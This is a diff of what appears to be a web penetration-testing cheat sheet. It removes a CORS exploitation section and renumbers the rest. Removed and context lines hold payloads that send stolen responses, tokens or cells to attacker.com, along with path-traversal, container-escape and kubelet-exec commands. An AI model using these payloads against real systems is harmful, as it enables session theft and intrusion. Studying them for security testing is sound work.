@@ -11,13 +11,12 @@
 1. [Cross-Site Scripting (XSS)](#1-cross-site-scripting-xss)
 2. [SQL Injection](#2-sql-injection)
 3. [Server-Side Request Forgery (SSRF)](#3-server-side-request-forgery-ssrf)
-4. [Cross-Origin Resource Sharing (CORS)](#4-cross-origin-resource-sharing-cors)
-5. [Authentication & Session Management](#5-authentication--session-management)
-6. [Authorization & Access Control](#6-authorization--access-control)
-7. [Prototype Pollution](#7-prototype-pollution)
-8. [XML & File Parsing](#8-xml--file-parsing)
-9. [Infrastructure & Cloud](#9-infrastructure--cloud)
-10. [Business Logic](#10-business-logic)
+4. [Authentication & Session Management](#4-authentication--session-management)
+5. [Authorization & Access Control](#5-authorization--access-control)
+6. [Prototype Pollution](#6-prototype-pollution)
+7. [XML & File Parsing](#7-xml--file-parsing)
+8. [Infrastructure & Cloud](#8-infrastructure--cloud)
+9. [Business Logic](#9-business-logic)
 
 ---
 
@@ -827,128 +826,9 @@ Detection:
 
 ---
 
-## 4. Cross-Origin Resource Sharing (CORS)
+## 4. Authentication & Session Management
 
-### 4.1 Three-Part Test for Exploitable CORS
-
-```javascript
-// === TEST 1: Does the server reflect arbitrary origins? ===
-// Send request with Origin: https://evil.com
-GET /api/sensitive-data HTTP/1.1
-Host: target.com
-Origin: https://evil.com
-
-// Vulnerable response:
-HTTP/1.1 200 OK
-Access-Control-Allow-Origin: https://evil.com
-Access-Control-Allow-Credentials: true
-
-// === TEST 2: Is the Access-Control-Allow-Credentials header present? ===
-// If true, cookies will be sent with cross-origin requests
-
-// === TEST 3: Can we actually exploit it from a browser? ===
-// Exploit page hosted on https://evil.com:
-<script>
-fetch('https://target.com/api/sensitive-data', {
-  credentials: 'include'
-})
-.then(r => r.json())
-.then(data => {
-  fetch('https://attacker.com/steal?d=' + btoa(JSON.stringify(data)));
-});
-</script>
-```
-
-### 4.2 CORS Misconfiguration Types
-
-| Type | Configuration | Exploitable? |
-|------|--------------|-------------|
-| **Wildcard with credentials** | `Access-Control-Allow-Origin: *` + `Credentials: true` | YES - High |
-| **Dynamic origin reflection** | Reflects any origin | YES - Critical |
-| **Null origin allowed** | `Access-Control-Allow-Origin: null` | YES - High |
-| **Subdomain trust** | `*.target.com` | Maybe - if XSS on subdomain |
-| **Weak regex matching** | `/.*target\.com/` | YES - High |
-| **Preflight bypass** | Complex requests without preflight | Maybe |
-
-### 4.3 Preflight Bypass Techniques
-
-```javascript
-// Standard preflight flow:
-// 1. Browser sends OPTIONS request
-// 2. Server responds with allowed origins/methods/headers
-// 3. Browser sends actual request
-
-// Bypass 1: Use simple request (no preflight needed)
-// Simple requests: GET, HEAD, POST with specific content-types
-// Content-Types that don't trigger preflight:
-// - application/x-www-form-urlencoded
-// - multipart/form-data
-// - text/plain
-
-// Bypass 2: Custom headers might not trigger preflight if allowed
-fetch('https://target.com/api/data', {
-  method: 'POST',
-  headers: {'Content-Type': 'text/plain'},  // Simple request
-  body: JSON.stringify({malicious: 'data'})
-});
-
-// Bypass 3: XHR withCredentials
-var xhr = new XMLHttpRequest();
-xhr.open('GET', 'https://target.com/api/data', true);
-xhr.withCredentials = true;
-xhr.onload = function() {
-  fetch('https://attacker.com/steal?d=' + btoa(xhr.responseText));
-};
-xhr.send();
-```
-
-### 4.4 Null Origin Exploitation
-
-```javascript
-// If server responds with:
-// Access-Control-Allow-Origin: null
-// Access-Control-Allow-Credentials: true
-
-// Exploit via iframe sandbox:
-<iframe sandbox="allow-scripts" srcdoc="
-  <script>
-    fetch('https://target.com/api/data', {
-      credentials: 'include'
-    })
-    .then(r => r.text())
-    .then(d => fetch('https://attacker.com/?c=' + btoa(d)));
-  </script>
-"></iframe>
-
-// The sandboxed iframe has origin "null"
-// Server accepts null origin with credentials
-// Cookies are sent with the request
-```
-
-### 4.5 SameSite=None Analysis
-
-```javascript
-// When cookies have SameSite=None, they are sent cross-origin
-// This makes CORS vulnerabilities more dangerous
-
-// Check cookie attributes:
-// Set-Cookie: session=abc; SameSite=None; Secure
-// Set-Cookie: session=abc; SameSite=Lax
-// Set-Cookie: session=abc; SameSite=Strict
-
-// SameSite=None + CORS misconfiguration = Full account takeover
-// Attacker can:
-// 1. Load target.com in iframe
-// 2. CORS request includes cookies (SameSite=None)
-// 3. Steal session token via CORS response
-// 4. Hijack account
-```
-
----
-
-## 5. Authentication & Session Management
-
-### 5.1 OAuth/OIDC Attack Chains
+### 4.1 OAuth/OIDC Attack Chains
 
 #### Authorization Code Flow Attacks
 
@@ -1006,7 +886,7 @@ fetch('https://attacker.com/steal?token=' + token);
 </script>
 ```
 
-### 5.2 JWT Attacks
+### 4.2 JWT Attacks
 
 #### Algorithm Confusion (alg: none)
 
@@ -1107,7 +987,7 @@ token = jwt.encode({"user": "admin"}, private_key, algorithm="RS256", headers=he
 # Server may verify using the injected JWK instead of its own key
 ```
 
-### 5.3 Session Fixation & Hijacking
+### 4.3 Session Fixation & Hijacking
 
 ```bash
 # === Session Fixation ===
@@ -1134,7 +1014,7 @@ GET /login
 # 3. Try to predict next session ID
 ```
 
-### 5.4 MFA Bypass Techniques
+### 4.4 MFA Bypass Techniques
 
 ```bash
 # === Bypass 1: Brute force OTP ===
@@ -1172,9 +1052,9 @@ GET /api/admin/dashboard
 
 ---
 
-## 6. Authorization & Access Control
+## 5. Authorization & Access Control
 
-### 6.1 IDOR Patterns
+### 5.1 IDOR Patterns
 
 #### Direct Reference
 
@@ -1221,7 +1101,7 @@ curl "https://target.com/api/user/aWQ9MTI0"
 # If HMAC secret is known or weak, forge signatures
 ```
 
-### 6.2 Path Traversal
+### 5.2 Path Traversal
 
 ```bash
 # === Basic traversal ===
@@ -1257,7 +1137,7 @@ expect://whoami
 file:///etc/passwd
 ```
 
-### 6.3 Mass Assignment
+### 5.3 Mass Assignment
 
 ```bash
 # === Parameter discovery ===
@@ -1295,7 +1175,7 @@ POST /api/user/update
 }
 ```
 
-### 6.4 HTTP Parameter Pollution (HPP)
+### 5.4 HTTP Parameter Pollution (HPP)
 
 ```bash
 # === Server-side HPP ===
@@ -1328,9 +1208,9 @@ GET /api/page?format=json&format=html
 
 ---
 
-## 7. Prototype Pollution
+## 6. Prototype Pollution
 
-### 7.1 Detection by Language
+### 6.1 Detection by Language
 
 #### Node.js Detection
 
@@ -1397,7 +1277,7 @@ POST /api/settings
 params.merge!(user_input)  # If user_input contains class modification
 ```
 
-### 7.2 Gadget Chain Construction
+### 6.2 Gadget Chain Construction
 
 #### Node.js Common Gadgets
 
@@ -1457,7 +1337,7 @@ POST /api/preferences
 }
 ```
 
-### 7.3 Client-Side Prototype Pollution to XSS
+### 6.3 Client-Side Prototype Pollution to XSS
 
 ```javascript
 // === DOM Clobbering to Prototype Pollution ===
@@ -1494,9 +1374,9 @@ location.search = "?__proto__[ALLOWED_ATTR]=[onerror,src]"
 
 ---
 
-## 8. XML & File Parsing
+## 7. XML & File Parsing
 
-### 8.1 XXE (XML External Entity) Attacks
+### 7.1 XXE (XML External Entity) Attacks
 
 #### Basic XXE
 
@@ -1579,7 +1459,7 @@ location.search = "?__proto__[ALLOWED_ATTR]=[onerror,src]"
 <!ENTITY xxe SYSTEM "php://filter/read=string.rot13/resource=/etc/passwd">
 ```
 
-### 8.2 Billion Laughs (XML Entity Expansion)
+### 7.2 Billion Laughs (XML Entity Expansion)
 
 ```xml
 <?xml version="1.0"?>
@@ -1599,7 +1479,7 @@ location.search = "?__proto__[ALLOWED_ATTR]=[onerror,src]"
 <!-- 10^9 "lol" strings = ~3GB memory expansion -->
 ```
 
-### 8.3 CSV Injection
+### 7.3 CSV Injection
 
 ```csv
 # Malicious CSV payload
@@ -1618,7 +1498,7 @@ Username,Role,Admin
 =WEBSERVICE("http://attacker.com/?c="&A1)
 ```
 
-### 8.4 PDF Injection
+### 7.4 PDF Injection
 
 ```pdf
 # PDF form injection
@@ -1634,7 +1514,7 @@ Username,Role,Admin
 <</Type/Action/S/URI/URI(file:///etc/passwd)>>
 ```
 
-### 8.5 Archive-Based Attacks
+### 7.5 Archive-Based Attacks
 
 #### Zip Slip
 
@@ -1667,9 +1547,9 @@ with tarfile.open('malicious.tar', 'w') as t:
 
 ---
 
-## 9. Infrastructure & Cloud
+## 8. Infrastructure & Cloud
 
-### 9.1 Container Escape Patterns
+### 8.1 Container Escape Patterns
 
 ```bash
 # === Check if inside container ===
@@ -1718,7 +1598,7 @@ chmod a+x /cmd
 sh -c "echo \\$$ > /tmp/cgrp/x/cgroup.procs"
 ```
 
-### 9.2 Kubernetes Misconfigurations
+### 8.2 Kubernetes Misconfigurations
 
 ```bash
 # === Check for Kubernetes service account token ===
@@ -1753,7 +1633,7 @@ curl http://node-ip:10255/spec
 curl -k https://node-ip:10250/exec/default/pod-name/container-name?command=whoami
 ```
 
-### 9.3 S3 Bucket Enumeration & Exploitation
+### 8.3 S3 Bucket Enumeration & Exploitation
 
 ```bash
 # === Bucket enumeration ===
@@ -1787,7 +1667,7 @@ aws s3 ls s3://company-bucket/ --no-sign-request
 # Check bucket policy for "Principal": "*"
 ```
 
-### 9.4 Lambda/Serverless Injection Points
+### 8.4 Lambda/Serverless Injection Points
 
 ```bash
 # === Event injection ===
@@ -1819,9 +1699,9 @@ aws s3 ls s3://company-bucket/ --no-sign-request
 
 ---
 
-## 10. Business Logic
+## 9. Business Logic
 
-### 10.1 Race Condition Exploitation
+### 9.1 Race Condition Exploitation
 
 #### Coupon Multiple Application
 
@@ -1915,7 +1795,7 @@ async def main():
 asyncio.run(main())
 ```
 
-### 10.2 Price Manipulation
+### 9.2 Price Manipulation
 
 ```bash
 # === Client-side price manipulation ===
@@ -1956,7 +1836,7 @@ Content-Type: application/json
 }
 ```
 
-### 10.3 Workflow Bypass
+### 9.3 Workflow Bypass
 
 ```bash
 # === Step skipping ===
@@ -1992,7 +1872,7 @@ POST /api/verify-email
 }
 ```
 
-### 10.4 Feature Abuse
+### 9.4 Feature Abuse
 
 ```bash
 # === Mass resource creation ===
